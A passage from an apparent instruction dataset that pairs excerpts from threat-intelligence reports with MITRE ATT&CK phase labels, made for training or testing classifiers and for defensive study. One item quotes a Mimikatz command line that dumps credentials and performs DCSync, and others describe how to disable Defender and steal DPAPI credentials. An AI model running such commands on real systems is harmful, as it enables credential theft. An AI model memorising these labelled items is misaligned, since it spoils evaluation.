        "input": "Described attack activity: As described above, the maliciousMeetUpapp has been available atmeetup-chat[.]com, and we believe with high confidence that the maliciousMeetsAppwas available atmeetsapp[.]org. Neither app would be automatically installed from these locations; the victims had to choose to download and install the apps manually. Considering that only a handful individuals were compromised, we believe that potential victims were highly targeted and lured using romance schemes, with Transparent Tribe operators most likely establishing first contact via another messaging platform. After gaining the victims' trust, they suggested moving to another  allegedly more secure  chat app that was available on one of the malicious distribution websites.\nThere was no subterfuge suggesting the app was available in Google Play.",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The initial execution through the OneNote lure required the person who received the email attachment to open the OneNote file. After clicking through the warning prompt, the O p e n.cmd file executed PowerShell to download an IcedID DLL named as if it was a JPG file, then used rundll32 to execute the DLL, which immediately connected to command and control servers, checked in and started beaconing over unencrypted HTTP, triggering an Emerging Threats Open rule: ET MALWARE Win32/IcedID Request Cookie.\nThe earliest indicators that something suspicious occurred were the Sysmon events: File Created (Event ID 11) and File Stream Created (Event ID 15) that showed a .cmd file with the Mark of the Web was created by OneNote:\nThe metadata of the O p e n.cmd batch file can befound on VirusTotal, and the contents are shown below. It is a very simple batch script that uses basic obfuscation, but yet presents some easy detection opportunities in its behavior:\nAfter de-obfuscating the batch file (or by observing the child processes created during dynamic analysis), the purpose of the script becomes clear.\nIt uses PowerShell to download a payload file from a URL. The remote server request makes it look like it could be a GIF image that is being downloaded. The file is dropped to C:\\programdata\\ using a filename that looks like a JPEG image. The real filetype is actually a DLL:\nThe file was then run using rundll32.\nSomewhat surprisingly, more than a month after initial access in the intrusion, after the threat actor had started interacting with the compromised machine using AnyDesk, they opened the OneNote file and double-clicked the Open button to launch IcedID again. We are unsure of the motivation of this action, but this represented another chance for defenders to respond if detections were in place.\nExecution of Cobalt Strike Beacon\nOn the 33rd day of the intrusion, the IcedID malware was observed dropping several files.\nThese files were Cobalt Strike beacons, which were then executed via the IcedID malware. IcedID was running in rundll32.exe, which launched a DLL version of Cobalt Strike beacon from the user's AppData\\Local\\Temp directory using regsvr32.exe. The IcedID rundll32.exe process also launched an EXE version of a beacon named \"Funa2.exe\" from the same Temp directory.\nDuring lateral movement activity, the threat actors deployed the same executable Cobalt Strike beacon as seen on the beachhead host. This time, they used the name csrss.exe and executed these using the RDP session. The files were downloaded onto the lateral hosts using Internet Explorer, then executed by clicking directly from the Internet Explorer download prompt or by double-clicking in File Explorer window.\nThroughout the later stages of the intrusion the Cobalt Strike beacons used various named pipes.\nOne of the many effective ways to detect Cobalt Strike beacon in this intrusion was through the named pipes it created, which used the default naming patterns. These pipe creation events were observed with Sysmon.\nA DLL version of the Cobalt Strike beacon was dropped on the beachhead host in the Local AppData Temp directory and executed with RegSvr32.exe, but that process did not create any named pipes.\nThe default Cobalt Strike pipes are (the \"*\" symbolize the prefix/suffix):\nMore strategies for detecting Cobalt Strike can be found inCobalt Strike, a Defender's Guide part 1andpart 2.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attackers enabled WDigest registry settings, which forced the system to use WDigest protocol for authentication, resulting in lsass.exe retaining a copy of the user's plaintext password in memory. This change allowed the attackers to steal the actual password, not just the hash. Later, Mimikatz was run to dump local credentials and perform a DCSYNC attack. \nC:\\Users\\Public\\ab.exe ab.exe privilege::debug sekurlsa::logonpasswords full exit cmd/c c:\\users\\public\\appdata\\mini \"1sadump::dcsync/domain: \nFigure 8. Mimikatz usage ",
        "output": "credential access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Credentials from Password Stores\nDonPAPI & Impacket dpapi:DonPAPI provides functionalities to locate and retrieve Windows Data Protection API (DPAPI) protected credentials from compromised Windows systems, such as:\nChromium browser credentials, cookies and tokens. \nFirefox browser credentials and cookies. \nWindows certificates. \nCredential manager. \nVaults credentials.\nThe .bash_history shows that the threat actor employed DonPAPI with the following command-line options:\n-pvk <pvk name>.pvk:specifies the Private Key File (PVK) used to decrypt DPAPI-protected credentials. \nno_vnc:disables the collection of VNC credentials. \nno_remoteops:disables the collection of credentials from remote systems. \nGetHashes:enables the collection of NTLM hashes. \nno_recent:disables the collection of recent files and documents \nno_sysadmins:excludes systems administrators from the credential collection process \n-o <filename>:saves the output into a specific folder.\nThe threat actor also employs dpapi.py from the Impacket suite to retrieve domain backup keys.\nSteal or Forge Authentication Certificates\nCertipy:Certipy is a Python-based tool created for interacting with Active Directory Certificate Services (AD CS), specifically to enumerate, identify and exploit vulnerable certificate templates with the final aim of impersonating high-privileged accounts.\nThe following image shows how the threat actor launched the find functionality to detect vulnerable AD CS templates.\nSteal or Forge Kerberos Tickets: Kerberoasting\nOrpheus:Orpheus is an offensive Python tool designed by Trustedsec based on Impacket's GetUserSPNs.py and kerberosv5.py. The tool is built with defense evasion mechanisms since it changes the encryption type from RC4 (eType 23), which is common for Kerberoasting attack, to AES-256 (eType 18) that is usual in legitimate traffic.\nBased on the available .bash_history file, the threat actor only downloaded the tool.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Let's go over the vulnerability overview given by the runC team:\nThe vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command ... as root within a container in either of these contexts:\nCreating a new container using an attacker-controlled image. \nAttaching (docker exec) into an existing container which the attacker had previous write access to.\nThose two scenarios might seem different, but both require runC to spin up a new process in a container and are implemented similarly. In both cases, runC is tasked with running a user-defined binary in the container. In Docker, this binary is either the image's entry point when starting a new container, or docker exec's argument when attaching to an existing container.\nWhen this user binary is run, it must already be confined and restricted inside the container, or it can jeopardize the host. In order to accomplish that, runC creates a 'runC init' subprocess which places all needed restrictions on itself (such as entering or setting up namespaces) and effectively places itself in the container. Then, the runC init process, now in the container,callsthe execve syscall to overwrite itself with the user requested binary.\nThis is the method used by runC both for creating new containers and for attaching a process to an existing container.\nThe researchers who revealed the vulnerability discovered that an attacker can trick runC into executing itself by asking it to run /proc/self/exe, which is a symbolic link to the runC binary on the host.\nAn attacker with root access in the container can then use /proc/[runc-pid]/exe as a reference to the runC binary onthe hostand overwrite it. Root access in the container is required to perform this attack as the runC binary is owned by root.The next time runC is executed, the attacker will achieve code execution on the host. Since runC is normally run as root (e.g. by the Docker daemon), the attacker will gain root access on the host.\nThe image above might mislead some to believe the vulnerability (i.e. tricking runC into executing itself) is redundant. That is, why can't an attacker simply overwrite /proc/[runc-init-pid]/exe instead?A patch for a similar runC vulnerability,CVE-2016-9962, mitigates this kind of attack.CVE-2016-9962 revealed that the runC init process possessed open file descriptors from the host which could be used by an attacker in the container to traverse the host's filesystem and thus break out of the container. Part of the patch for this flaw was setting the runc init process as 'non-dumpable' before it entering the container.\nIn the context of CVE-2019-5736, the 'non-dumpable' flag denies other processes from dereferencing /proc/[pid]/exe, and therefore mitigates overwriting the runC binary through /proc/[runc-init-pid]/exe[1]. Calling execve drops this flag though, and hence the new runC process' /proc/[runc-pid]/exe is accessible.\nThe vulnerability may appear to contradict the way symbolic links are implemented in Linux.Symbolic links simply hold the path to their target. For a runC process, /proc/self/exe should contain something like /usr/sbin/runc.When a symlink is accessed by a process, the kernel uses the path present in the link to find the target under the root of the accessing process.That begs the question \u2013when a process in the container opens the symbolic link to the runC binary, why doesn't the kernel searches for the runC path inside the container root?\nThe answer is that /proc/[pid]/exe does not follow the normal semantics for symbolic links. Technically this might count as a violation ofPOSIX, but as I mentioned earlier procfs is a special filesystem. When a process opens /proc/[pid]/exe, there is none of the normal procedure of reading and following the contents of a symlink. Instead, the kernel just gives you access to the open file entry directly.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon initial access, threat actors use discovery techniques to gain an understanding of the environment in which they have accessed. This can include gathering information on the network, running scans, and enumerating users and groups.The information below will focus on some of the most notable tools and commands we observed from our intrusions this past year.\nThe data above shows the command and record count of various discovery commands used by threat actors in our reports from 2022. Looking at the data we have collected for the past year, it is clear that the most commonly used commands are the ones that leverage Windows binaries to gather information about the host and network, such as IP addresses, active connections, and system-related information.\nSome commands, like the net and nltest, are used to collect information on network resources accessible from the compromised host. The reason behind the high count of these commands is that they are run by both Hands-On-Keyboard operators and as part of automated execution by malware upon the initial infection.\nAn exception to the above is AdFind, which is a command-line Active Directory query tool that we've seenover the years.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Microsoft 365 Defender built-in detection: Multiple searches for sensitive data in SharePoint sites \nThis detection looks for instances where a user searched for sensitive data on SharePoint sites that an attacker can use as internal information to leverage in later attacks if the user's account is compromised. \nInvestigate the user account performing the queries to determine if it was compromised. Determine what, if any, sensitive information was accessed to assess the impact. \nNote: Data used in this detection requires advanced audit to be enabled in Microsoft Defender 365 that includes the SearchQueryInitiatedSharePoint event type. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Gamaredon APT actors likely gained initial footholds into targeted networks through malicious Microsoft Office documents distributed via email. This is consistent with spear-phishing techniques common to this APT. \nMalicious VBS macros concealed within remote templates execute when the user opens the document. The macros download RAR archives containing LNK files. The naming convention of the RAR archives in this campaign follows a similar pattern: \n31.07.2022.rar   \n04.08.2022.rar   \n10.08.2022.rar \nThese compressed archives usually contain just the LNK file. The LNK files and Microsoft Office document names contain references pertinent to the Russian invasion of Ukraine: ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The vulnerability detailed above lies in thecontainers/storage. This library is used by CRI-O and Podman to handle storage and download of container images. When triggering the vulnerability, their vital functionality breaks down. Some of the impacts I was able to observe after triggering this DoS vulnerability include:\n1 - Fails to pull new images.\n2 - Fails to start any new containers (even if they are already pulled).\n3 - Fails to retrieve local images list.\n4 - Fails to kill containers.\n1 - Fails to pull new images.\n2 - Fails to retrieve running pods.\n3 - Fails to start new containers (even if they are already pulled).\n4 - Fails to exec into containers.\n5 - Fails to retrieve existing images.\n6 - Fails to kill existing containers.\nAs of Kubernetes v1.20, Docker is deprecated and the only container engines supported are CRI-O and Containerd. This leads to a situation in which many clusters use CRI-O and are vulnerable. In an attack scenario, an adversary may pull a malicious image to multiple different nodes, crashing all of them and breaking the cluster without leaving a way to fix the issue other than restarting the nodes.",
        "output": "impact",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The implant resides within a modified Cisco IOS image and, when loaded, maintains its persistence in the environment, even after a system reboot. However, any further modules loaded by the attacker will only exist in the router's volatile memory and will not be available for use after reboot. From a forensic standpoint, if the modules are loaded in volatile memory, one can analyze them by obtaining a core dump of the router image[1]. ",
        "output": "persistence",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ProcDump\nA remote service was created on one of the workstations in order to dump lsass.Event 7045 from Service Control Manager",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Execution Summary \nSUNSHUTTLE is a backdoor written in GoLang. Once SUNSHUTTLE is executed, a high-level description of the execution is the following: \nConfiguration settings determined   \nRequest a \"session key\" from the C2   \nRetrieve the \"session key\" from the C2 Once a session key is retrieved, SUNSHUTTLE begins command request beaconing loop   \nBegin command request beaconing   \nResolve command and perform action \nThe SUNSHUTTLE sample analyzed retains the names of the routines used by the malware, which include the following: \nNote: Throughout the SUNSHUTTLE backdoor, unique string identifiers are used to indicate the operation being performed to the C2 via a Cookie header, and unique string identifiers are also used to validate and parse response content from the C2. \nThese unique string values are thought to be unique and random per compiled sample. \nInitial Execution \nOnce executed, the SUNSHUTTLE backdoor enumerates the victim's MAC address and compares it to a hardcoded MAC address value \"c8:27:cc:c2:37:5a\". If a match is found the backdoor exits. The MAC address is likely a default MAC address for the Windows sandbox network adapter. ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Prior to launching the final stage of the attack, the threat actors gained administrative access to a deployed endpoint detection and response (EDR) solution to make modifications, removing libraries that affected the agents across the enterprise. In addition, a binary to disable components of Microsoft Defender Antivirus was propagated using custom tooling. The distributed binary named disable-defender.exe queries for TokenElevation using the GetTokenInformation API and checks if the process is running with elevated privileges. If the token is not running with elevated privilege, the binary prints \"Must run as admin $|!\\backslash\\mathfrak{n^{\\prime\\prime}}$ . If the token is elevated, it queries TokenUser and checks if the SID is $\"{\\sf S}-1-5-18\"$ . If the current process doesn't run under system context, it prints \"Restarting with privileges\\n\" and attempts to elevate the privilege. \nTo elevate the privilege, the binary checks if the TrustedInstaller service is enabled. To do this, it starts the service \"SeDebugPrivilege\" and \"SeImpersonatePrivilege\" to assign privileges to itself. It then looks for winlogon.exe process, acquires its token, and impersonates calling thread using ImpersonateLoggedOnUser/SetThreadToken. After impersonating as winlogon.exe, it opens TrustedInstaller process, acquires its token for impersonation and creates a new process with elevated privileges using CreateProcessWithTokenW. \nOnce it successfully creates its own process with TrustedInstaller privilege, it proceeds to disable Defender components. \nTerminates smartscreen.exe   \nModifies WinDefend service to DemandLoad.   \nModifies \"TamperProtection\" value to 0   \nQueries WMI \"Root\\Microsoft\\Windows\\Defender\" Namespace \"MSFT_MpPreference\" class for \"DisableRealtimeMonitoring\"   \nSets \"DisableAntiSpyware\" value to 1   \nSets \"SecurityHealth\" value to 3   \nSets \"DisableAntiSpyware\" value to 0   \nSets \"SYSTEM\\CurrentControlSet\\Services\\WinDefend\" service \"Start\" value to 3   \nSets \"DisableRealtimeMonitoring\" value to 1   \nModifies further settings using WMI \"Root\\Microsoft\\Windows\\Defender\" Namespace \"MSFT_MpPreference\" class values, \"EnableControlledFolderAccess\" \"PUAProtection\" \"DisableRealtimeMonitoring\" \"DisableBehaviorMonitoring\" \"DisableBlockAtFirstSeen\" \"DisablePrivacyMode\" \"SignatureDisableUpdateOnStartupWithoutEngine\" \"DisableArchiveScanning\" \"DisableIntrusionPreventionSystem\" \"DisableScriptScanning\" \"DisableAntiSpyware\" \"DisableAntiVirus\" \"SubmitSamplesConsent\" \"MAPSReporting\" \"HighThreatDefaultAction\" \"ModerateThreatDefaultAction\" \"LowThreatDefaultAction\" \"SevereThreatDefaultAction\" \"ScanScheduleDay\" \nAdditional evasion techniques included the deletion of tooling, Windows events, and application logs. ",
        "output": "defense evasion",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.\nThe threat actor then proceeded to connect over port 22 to a server in Romania.\nAs the traffic was encrypted we can't conclusively determine what data was exfiltrated. However we can infer that the choice to deploy on the file server was due to the data present and ease to move the data.\nAnother data point is that following the exfiltration canary documents present in the shares reported in as being opened from an IP on a Virtual Private Host provider in New York, USA.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During discovery actions, the threat actors were observed using 7-Zip to archive data collected from active directory using AdFind.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Hancitor contacted its servers over HTTP and advertised details about the compromised machine, user, and domain while also retrieving instructions from the command and control server (1). From another dedicated location, 4a5ikol[.]ru, two Cobalt Strike beacons and Ficker Stealer malware were downloaded through HTTP (2).\nA successful connection from Ficker Stealer was not observed. A domain was queried; however, the response returned an error.\nCobalt Strike was also observed to be making use of HTTP.\nLastly, the shellcode executed by the agent1.ps1 PowerShell loader, was observed loading a PE file into memory that would beacon out at consistent intervals to 64.235.39[.]32. Further encrypted network activity was also observed to this IP address. Unfortunately, the tool sending these connections could not be definitively determined.\nThe user agent for this was curl/7.55.1\nHancitor\nhttp://wortlybeentax[.]com/8/forum.php\n4a5ikol[.]ru\nCobalt Strike190.114.254.116:80   This Cobalt Strike server was added to ourThreat Feedon 2021-05-16 and is still alive as of 2021-10-31\n207.148.23.64:443   This Cobalt Strike server was added to ourThreat Feedon 2021-07-15. This IP stopped hosting Cobalt Strike on or around 2021-08-22.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The use of the Cobalt Strike's piped privilege escalation (Get-System) was used several times during the intrusion.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the second day of the intrusion, the threat actors used the IcedID malware to drop a Cobalt Strike beacon and execut it using regsvr32.exe.\nAfter beginning to move laterally, the threat actors used many other execution techniques such as PowerShell and executables run from their interactive RDP session in addition to DLLs.\nA number of application crashes were observed across several compromised hosts. This activity was a result of the threat actors attempting to execute various dropped tools or beacons on the endpoint, triggering a Windows Error Reporting (WER) fault process.\nApplication crashes are recorded in the Windows Application event log under Event ID 1000 and 1001.\nTheNSA Cyber Windows Event Monitoring Guidance, has the following statement:\nIn this case, the threat actors attempted to rectify the issue by deploying new beacons, renaming executable files by either appending a double extension or adding extra characters to the filename (i.e. lsass.exe to lsasss.exe).\nSome of these crashes may have been in response to being detected by Microsoft Defender. These signatures were found in the logs on various hosts.\nHackTool:Win32/NamedPipeImpers.A \nTrojanDropper:PowerShell/Cobacis.B \nVirTool:MSIL/Menace.C!MTB\nThere was evidence that that the Cobalt Strike aggressor script AnnoyKit was leveraged to launch Internet Explorer via a COM object.\nDecoded from Base64:\nThe decoded PowerShell function is readable in the PowerShell logs:\nThe PowerShell script used is publicly available, and can be foundhere, along with the CNA script.\nWe were unable to ascertain the purpose of running this script or how it furthered the threat actor's goals.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The intrusion started with the execution of a  executable nameddocument8765.exe. According toHuntress, this initial access file was delivered to end users after browsing tohttps[:]//environmentca[.]com/bkh6q. In Huntress's data, the site was loaded from an Outlook process indicating likely email delivery.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Trickbot (click.php.dll)was manually executed on a single endpoint.\nSource:https://tria.ge/210412-wmdnkzp5la\nTrickbot, from its injected wermgr process, spawned a command process to then run a PowerShell Cobalt Strike Beacon.\nReviewing the above PowerShell code, we can extract the shellcode to discover the IP and User-agent string, the beacon will communicate with.\nGetting the IP and port usingscdbg.\nThe threat actor also executed a second Cobalt Strike Beacon (wsuC3C.tmp)using the injectedwermgr.exe process.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Persistence was setup using Koadic to schedule a task to execute a HTA file located in the C:\\ProgramData directory at logon as system. This will initiate C2 back to the Koadic server.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Aside from the initial compromise on the beachhead host and the stolen credentials, no further impact was observed duringthis intrusion. No lateral movement or execution on mission was observed.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This file was seen executed locally via cmd, and on remote systems using wmic.\nSMB was also used to transfer Cobalt Strike Beacon executables to the ADMIN$ share on systems, which were then executed via a service.\nAdditionally, we also witnessed the use of overpass-the-hash. Here we can see a 4624 event with seclogo as the logon process and logon type 9 which tells us some form of pass the hash occurred.\nShortly after we see a couple Kerberos service ticket requests for that user.\nThis alert fired a couple times based on network activity.\nHere's some helpful information when looking for PTH or OPTH fromStealthbits",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor executed an xml file named wbw hosted at 95.142.39[.]135 by exploitingCVE-2020-14882.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors used three different ways to access the hosts within this network:\nIcedID \nCobalt Strike \nAnyDesk\nBelow is an overview of each of the stages found during the intrusion.\nIcedID\nIcedID uses multiple staged domains to deliver parts of its functionality. The IcedID DLL running in the rundll32 process immediately connected to its command and control server on port 80, using domain name aerilaponawki[.]com, which resolved at the time to 193.149.129.131. The contents of this network connection matched a malware rule in the free Emerging Threats Open ruleset ET MALWARE Win32/IcedID Request Cookie.\nThe IcedID process also connected to two other command and control servers by domain name, but both of these connections used TLS over port 443, so it was not possible for the network sensor to observe as much content or match as many network detection rules as it would have with TLS termination or unencrypted traffic. The connection to klindriverfor[.]com (5.255.102.167) on port 443 repeated about once every 10 minutes for 12 days. The connection to alishaskainz[.]com (45.61.139.206) on port 443 also repeated about once every 10 minutes for 28 days.\nBelow table shows an overview and function of each domain:\nFor each of the domains, an overview of the relevant rules that can be used (in combination) to look for IcedID behavior:\naerilaponawki[.]com:\nET MALWARE Win32/IcedID Request Cookie\nklindriverfor[.]com:\nET POLICY OpenSSL Demo CA - Internet Widgits Pty (0)\nalishaskainz[.]com:\nET POLICY OpenSSL Demo CA - Internet Widgits Pty (0)\nhalicopnow[.]com:\nET POLICY OpenSSL Demo CA - Internet Widgits Pty (0)\nWhen looking for additional strange network connections, we can find these two gathered from a memory dump of the compromised systems. The connection from rundll32.exe is especially interesting and is related to our IcedID infection. It appears to be a different IP for one of the previously found command and control domains.\nCobalt Strike\nThe Cobalt Strike beacons which were used during the intrusion were named:\nagaloz.dll \nFuna2.exe / csrss.exe\nThey contain a configuration to contact the below command and control server:\nThe second screenshot shows the actual configured portion of the profile, which appears very similar tothis \"gmail\" profile. Communication goes via the URI:\nThe DFIR Report Threat Intel Team picked up this Cobalt Strike server on January 9th, 2023, weeks before the intrusion. On that day, the beacon profile resembled a freely availablemalleable C2 profile that mimics jquery.\nThe command and control server appears to have been in use through at least April 2024 with a different Cobalt Strike beacon reported to theTriagemalware sandboxing service using the same gmail-like profile and remote IP as observed in this intrusion.\nWith that said, it appears Microsoft took over this domain on April 6, 2023 when DNS was switched from Cloudflare to MICROSOFTINTERNETSAFETY.NET and the domain started resolving to 20.69.178.82 (Microsoft).\nWe can see the registration information was updated (date showing last updated) as well:\nWe were also able to locate thecomplaintby Microsoft, Fortra and Health-ISAC to acquire this domain:\nHere's an outtake of the domain and registration information from thecomplaint.\nAccording to The DFIR Report's Threat Intel Team, the IP was observed hosting Cobalt Strike through June 3, 2023.\nAfter initial deployment, the threat actors downloaded additional beacons, all of which have a parent process of the executable calledFuna2.exe. It appears that the .dll likely didn't work as expected, as five minutes later an .exe with the same name gets downloaded.\nDLL download attempt:\nChange to EXE download:\nShortly after, we find the first connection to the server using the malleable profile paths:\nAnyDesk\nDuring later stages of the intrusion, the threat actors deployed AnyDesk using a PowerShell script copied underC:\\ProgramData\\INSTALL.ps1. In addition, the copied PowerShell script was executed on multiple systems to facilitate the deployment of AnyDesk using the following commands:\nThis install script appears to be similar to the previouslyleaked powershell script used by Conti:\nAnyDesk can be used, either as an installed service (as we can see above) or it can use a portable version. The differences and limitations are written on the official site ofAnyDesk. As we are dealing with the 'installed' version, it will leave certain artifacts related to the installed version on the system. Multiple people have written about AnyDesk artifacts, such asInversecosorTylerBrozek, which help a lot during the forensic process related to Anydesk artifacts.\nFor thead_svc.tracewe can find entries like this:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access to the device is gained by tricking a potential victim into installing a fake, but functional, app. As described in the Timeline of eXotic Visit apps section, the malicious ChitChat and WeTalk apps were distributed via dedicated websites (chitchat.ngrok[.]ioandwetalk.ngrok[.]io, respectively), and hosted on GitHub (https://github[.]com/Sojal87/).\nAt that time, three more apps LearnSindhi.apk,SafeChat.apk, andwechat.apk were available from the same GitHub account; we are not aware of their distribution vector. As of July 2023, these apps were not available for download from their GitHub repositories anymore. However, the same GitHub account now hosts several new malicious apps available for download. All of these new apps are also part of the malicious eXotic Visit espionage campaign, due to also containing variants of the same XploitSPY code.\nThe Dink Messenger and Alpha Chat apps were hosted on a dedicated website (letchitchat[.]info), from which victims were enticed into downloading and installing the app.\nThe Dink Messenger, Sim Info, and Defcom apps had been available on Google Play until their removal by Google.",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mark-of-the-Web Bypass\nThe threat actors delivered the initial malware as a zip file, with the contents of a ISO file, which contained their payload to gain access to the target environment. These packages are designed to evade controls such as Mark-of-the-Web restrictions.\nWindows Defender tampering\nOn one host, the threat actors ran the following command to try and clear the way for their activity, likely due to the difficulty the threat actors were having with beacons crashing.\nThis command was downloaded from a remote site to a file named pon!.txt and then executed locally.\nProcess injection\nMultiple suspicious calls to the function CreateRemoteThread (Sysmon Event ID 8) were observed. This is a known behavior of Cobalt Strike and its function shinject, which can be used to inject a new beacon or a specific program to another process on the victim's computer.\nAs a result, we observed abnormal winlogon.exe process behavior; winlogon.exe performed DNS requests (Sysmon event ID 22) to a Cobalt Strike C2 domain guteyutu[.]com.\nThe injection is also visible from memory dumps. Several hosts showed rundll32 processes exhibiting common process injection behavior, where the MZ file header is seen in the starting memory address in rundll32 processes with PAGE_EXECUTE_READWRITE permissions.\nMany of these beacons could also be detected in memory scanning with theMalpedia Cobalt Strikerule. A sample of a scanning run is displayed below:",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: One of the primary goals of a threat actor is to get privileged credentials. This enables the attackers to progress their intrusion and pivot within the network.\nHere's a look at the most common techniques we saw in 2022:\nWe will get deeper into thelsassandkerberoastingapproaches later, but for now, we just want to highlight how many different ways there are to acquire administrator credentials. The usage of mimikatz and in particular programs likeLaZagne, which are used to dump numerous items (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.), are unquestionably among the most common methods.\nThe \"SEO Poisoning  A Gootloader Story\" report has an illustration of such use:\nThe LSASS processis the number one target for threat actors because it contains various credentials. If the compromised account has the required privileges, LSASS can be dumped or accessed using several tools.It is easy to see how having the ability to dump the memory contents of this process allows the attacker to obtain the privileged passwords contained inside it. While the LSASS process is always the target, threat actors use a variety of tools to get at the credentials within. These strategies can range from the use of third-party frameworks like Cobalt Strike (describedhere), or system utilities like the Task Manager, to administrative tools like Sysinternals ProcDump.\nThe report \"BumbleBee Zeros in on Meterpreter\" contains an example of utilizing ProcDump for LSASS dump:\nThe use of a framework such as Cobalt Strike may be noticed inside the \"Dead or Alive an Emotet story\" report:\nThe Kerberoasting technique can be used to target and crack weak passwords of service accounts. Threat actors utilize a valid Kerberos ticket-granting ticket (TGT) to request a valid ticket-granting service (TGS) ticket. With this ticket the threat actors can try various offline brute forcing tools to crack the service account password. If cracked, these service accounts may have more privileged access allowing the threat actors to escalate their privileges in an enterprise network.\nThe report \"Dead or Alive an Emotet story\" showcased this technique:\nIn this specific instance, we can see how 